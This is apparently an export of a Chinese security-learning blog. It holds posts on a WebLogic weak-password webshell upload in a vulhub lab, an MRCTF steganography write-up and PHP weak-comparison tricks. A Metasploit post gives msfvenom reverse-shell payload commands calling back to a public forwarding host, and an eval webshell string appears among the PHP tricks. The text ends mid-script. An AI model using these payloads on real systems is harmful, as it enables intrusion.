<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
<span id="more"></span>

<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p>
<!--more-->

<p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p>
<p>以下环境为vulhub靶场环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>



<h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p>
<p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p>
<p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p>
<p>下面要准备war包上传</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p>
<p>点上传文件</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p>
<p>将jsp马（哥斯拉生成jsp）打包成war包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p>
<p>然后一直下一步，完成</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p>
<p>成功上传</p>
<p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p>
<p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p>
<p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p>
<p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p>
<p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p>
<p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><p>jboss/jboss +war上传</p>
<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h1><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1>]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>mrctf2021</title>
    <url>/2021/04/18/mrctf2021/</url>
    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
<span id="more"></span>

<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>

<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
<p>太菜了呜呜呜。</p>
<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
<hr>
<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MRCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>msf-端口转发-反弹shell</title>
    <url>/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p>这里借助的是免费的端口转发工具，来进行演示。</p>
<p><a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p>
<p><a href="https://console.uulap.com/app/login/?next=/">https://console.uulap.com/app/login/?next=/</a></p>
<p>都是有可以免费使用。</p>
<p>实验环境：</p>
<p>kali ：192.168.119.138   （内网）</p>
<p>对内网主机win/linux，反弹shell。</p>
<span id="more"></span>

<hr>
<p>这就涉及目标内网机器是否可以出网。反向连接reverse_tcp/正向连接bind_tcp</p>
<ul>
<li><p>reverse_tcp    目标主机可以出网，有些端口没有被拦截（不行换 80 443  8080，一般80端口不会拦截。）</p>
</li>
<li><p>bind_tcp          目标主机不可以出网，（开启主机关闭的端口，我们主动去连接）</p>
<p>参考：</p>
<p><a href="https://cloud.tencent.com/developer/article/1778292">https://cloud.tencent.com/developer/article/1778292</a></p>
<p><a href="http://www.voidcn.com/article/p-weuaffcv-bq.html">http://www.voidcn.com/article/p-weuaffcv-bq.html</a></p>
</li>
</ul>
<h2 id="反弹window-shell"><a href="#反弹window-shell" class="headerlink" title="反弹window-shell"></a>反弹window-shell</h2><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>tcp协议</p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.png" alt="1"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.1.png" alt="1.1"></p>
<h4 id="kali-msf"><a href="#kali-msf" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f exe &gt; zzz.exe           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.png" alt="2"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.1.png" alt="2.1"></p>
<h4 id="内网win"><a href="#内网win" class="headerlink" title="内网win"></a>内网win</h4><p>运行zzz.exe</p>
<h2 id="反弹linux-shell"><a href="#反弹linux-shell" class="headerlink" title="反弹linux-shell"></a>反弹linux-shell</h2><h4 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h4><p>和上面一样</p>
<h4 id="kali-msf-1"><a href="#kali-msf-1" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">show payloads  选择我们要使用的payload</span><br><span class="line"></span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f elf &gt; zzz.elf           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l1.png" alt="l1"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l2.png" alt="l2"></p>
<h4 id="内网linux"><a href="#内网linux" class="headerlink" title="内网linux"></a>内网linux</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x zzz.elf   给执行权限</span><br><span class="line"></span><br><span class="line">.&#x2F;zzz.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l3.png" alt="l3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实际上我们可以远程下载zzz.elf</span><br><span class="line"></span><br><span class="line">wget  http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xx&#x2F;zzz.elf</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>php漏洞</title>
    <url>/2021/01/28/php%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<ul>
<li>持续更新</li>
</ul>
<h2 id="0x01-php双引号解析漏洞"><a href="#0x01-php双引号解析漏洞" class="headerlink" title="0x01 php双引号解析漏洞"></a>0x01 php双引号解析漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ft</span></span><br><span class="line"><span class="comment"> * user: shmily-ing</span></span><br><span class="line"><span class="comment"> * Data: 2021/1/28 15:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span><span class="subst">$b</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a$b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果:</span></span><br><span class="line"><span class="comment">21</span></span><br><span class="line"><span class="comment">$a$b</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>输出结果不同，双引号和单引号都表示字符串，但双引号会对引号内容进行二次解释，就可能出现安全问题。</p>
<span id="more"></span>

<p>所以双引号内出现<code>$&#123;&#125;</code>, <code>&#123;&#125;</code>内的内容就会被当作php代码执行</p>
<p><code>$&#123;php命令&#125;</code>例如： “${@eval($_POST[‘a’])}”</p>
<p>但适用于php5.5以上的版本</p>
<h2 id="0x02-php类型"><a href="#0x02-php类型" class="headerlink" title="0x02  php类型"></a>0x02  php类型</h2><p>####类型转换</p>
<p>php把以<code>字母</code>开头的<code>字符或字符串</code>转化为<code>整型</code>时候，会变成<code>0</code>:<code>&#39;a123456&#39;==0</code></p>
<p>php把以<code>数字</code>开头的<code>字符串</code>转化为<code>整型</code>时候，只取到第一个字母之前的数字:<code>&#39;123456a111&#39;==123456</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;0);</span><br><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;&quot;0&quot;);</span><br><span class="line">var_dump(&#39;123456a111&#39;&#x3D;&#x3D;123456);</span><br><span class="line">var_dump(&#39;a123456&#39;&#x3D;&#x3D;0);</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20210721005633561.png" alt="image-20210721005633561"></p>
<h4 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h4><p>PHP在处理哈希字符串时，”OE”开头的都认为<code>0</code></p>
<p>以下值在md5加密后以0E开头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- QNKCDZO</span><br><span class="line">- 240610708</span><br><span class="line">- s878926199a</span><br><span class="line">- s155964671a</span><br><span class="line">- s214587387a</span><br><span class="line">- s214587387a</span><br></pre></td></tr></table></figure>



<p>以下值在sha1加密后以0E开头：</p>
<ul>
<li>sha1(‘aaroZmOk’)</li>
<li>sha1(‘aaK1STfY’)</li>
<li>sha1(‘aaO8zKZF’)</li>
<li>sha1(‘aa3OFF9m’)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$name</span>)==md5(<span class="variable">$passwd</span>)&amp;&amp;<span class="variable">$name</span>!=<span class="variable">$passwd</span>)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name=QNKCDZO&amp;passwd=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>

<h4 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$name</span>)===md5(<span class="variable">$passwd</span>)&amp;&amp;<span class="variable">$name</span>!==<span class="variable">$passwd</span>)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name[]=<span class="number">1</span>&amp;passwd[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>md5([1])===md5([2])==NULL</code></li>
</ol>
<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><p>命令执行函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
<hr>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>python-study</title>
    <url>/2021/01/10/python-study/</url>
    <content><![CDATA[<h2 id="0x01-MD5-encrypt-this-string"><a href="#0x01-MD5-encrypt-this-string" class="headerlink" title="0x01 MD5 encrypt this string"></a>0x01 MD5 encrypt this string</h2><p><img src="/2021/01/10/python-study/1.png" alt="image-20210129112157855"></p>
<p>提取字符串，进行md5加密，并提交。我还是太慢了，学学脚本。网络有点卡多提交几次</p>
<p>from hack the box web1</p>
<p>自己结合网上的学习了两种方法，re.search和re.findall，个人感觉还是比较喜欢第二种方法，感觉法二挺方便的</p>
<span id="more"></span>

<ul>
<li>法一</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re              <span class="comment">#字符串匹配</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=1nd51s259e9epagvhkgolgm5h7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588&quot;</span>&#125;</span><br><span class="line">url1 = <span class="string">&quot;http://159.65.87.50:32588/&quot;</span></span><br><span class="line">req1 = requests.get(url=url1,headers=head)</span><br><span class="line">str1= re.search(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(.)*&lt;/h3&gt;&quot;</span>,req1.text)</span><br><span class="line">str2=str1.group(<span class="number">0</span>).replace(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/h3&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print (str2)</span></span><br><span class="line">h1=hashlib.md5()</span><br><span class="line">h1.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">md5 =h1.hexdigest()</span><br><span class="line"><span class="comment">#print(md5)</span></span><br><span class="line">postdata=<span class="string">&quot;hash=&quot;</span>+md5</span><br><span class="line"></span><br><span class="line">req2=requests.post(data=postdata,url=url1,headers=head)</span><br><span class="line"><span class="built_in">print</span>(req2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>法二</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-   </span></span><br><span class="line"><span class="comment"># hack the box web1 re.findall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_str</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    md=hashlib.md5();</span><br><span class="line">    md.update(<span class="built_in">str</span>.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://138.68.182.108:31255/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=3brhsrsfuq7k869bg9s7bae6u4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://138.68.182.108:31255&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req1 = requests.get(url,headers=head)</span><br><span class="line"><span class="built_in">str</span> = re.findall(<span class="string">r&#x27;&lt;h3 align=.*&gt;(.*?)&lt;/h3&gt;&#x27;</span>,req1.text,re.S)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(str)</span></span><br><span class="line">mdstr=md5_str(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#print(mdstr)</span></span><br><span class="line">req2=requests.post(url,headers=head,data=<span class="string">&quot;hash=&quot;</span>+mdstr)</span><br><span class="line"><span class="comment">#print(req2.text)</span></span><br><span class="line">flag=<span class="string">&quot;HTB&#123;&quot;</span>+re.findall(<span class="string">&#x27;HTB\&#123;(.*?)\&#125;&#x27;</span>,req2.text,re.S)[<span class="number">0</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/10/python-study/1.1.png" alt="1.1"></p>
<h2 id="0x02-scan-dir目录扫描"><a href="#0x02-scan-dir目录扫描" class="headerlink" title="0x02 scan_dir目录扫描"></a>0x02 scan_dir目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#x27;</span>&#125;</span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line">zidian = sys.argv[<span class="number">2</span>]</span><br><span class="line">result = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(zidian,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip()</span><br><span class="line">        r =requests.get(url+line,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;\n   exist&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(result,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                f1.write(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;    exist\n&quot;</span>)    //写入result.txt</span><br><span class="line">        <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url +<span class="string">&quot;\n   false&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python  scan_dir.py  <a href="http://www.shmilying.top/">http://www.shmilying.top/</a>  F:\pycharm\python-study\zidian.txt   F:\pycharm\python-study\result.txt</p>
<p>result:</p>
<p><img src="/2021/01/10/python-study/2.0.png" alt="2.0"></p>
<p><img src="/2021/01/10/python-study/2.1.png" alt="2.1"></p>
<h2 id="0x03-file-open-r-w-a"><a href="#0x03-file-open-r-w-a" class="headerlink" title="0x03 file_open_r/w/a"></a>0x03 file_open_r/w/a</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">***read***</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f():</span><br><span class="line">        <span class="built_in">print</span>(a.strip())       <span class="comment">#最实用,方便，而且效果和下面的一样。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line.strip())     <span class="comment">#比较方便</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():  <span class="comment">#读取全部  == for line in f：</span></span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="built_in">print</span>(line.strip())  <span class="comment">#去除空行</span></span><br><span class="line">f.close()                 <span class="comment">#记得关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.readline()        <span class="comment">#读一行</span></span><br><span class="line"><span class="built_in">print</span>(line1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line2 = f.read(<span class="number">1</span>)           <span class="comment">#读字节</span></span><br><span class="line"><span class="built_in">print</span>(line2)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***write***</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)          <span class="comment">#open(&quot;zidian.txt&quot;,&quot;a&quot;) 在末尾追加,不影响原来的</span></span><br><span class="line">f.write(<span class="string">&#x27;\nxxxxx&#x27;</span>)                  <span class="comment">#open(&quot;zidian.txt&quot;,&quot;w&quot;) w:写入内容会覆盖原有内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f2.readlines():</span><br><span class="line">    <span class="built_in">print</span>(line.strip())</span><br><span class="line">f2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;c:\filename&quot;</span>,<span class="string">&quot;mode&quot;</span>)   //mode:r/w/a</span><br><span class="line">xxxxxxx</span><br><span class="line">xxxxxxx</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="0x04awd-sendflag"><a href="#0x04awd-sendflag" class="headerlink" title="0x04awd_sendflag"></a>0x04awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span 